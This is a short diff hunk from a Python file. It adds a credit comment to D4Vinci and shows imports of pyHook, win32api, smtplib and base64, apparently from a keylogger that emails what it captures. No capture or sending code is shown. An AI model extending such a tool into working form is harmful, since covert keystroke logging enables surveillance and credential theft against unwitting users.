@@ -61,7 +61,7 @@
 
  
 """
-
+#### original credit goes to Karim shoair (D4Vinci)
 import sys
 import win32api,pythoncom
 import pyHook,os,time,random,smtplib,string,base64
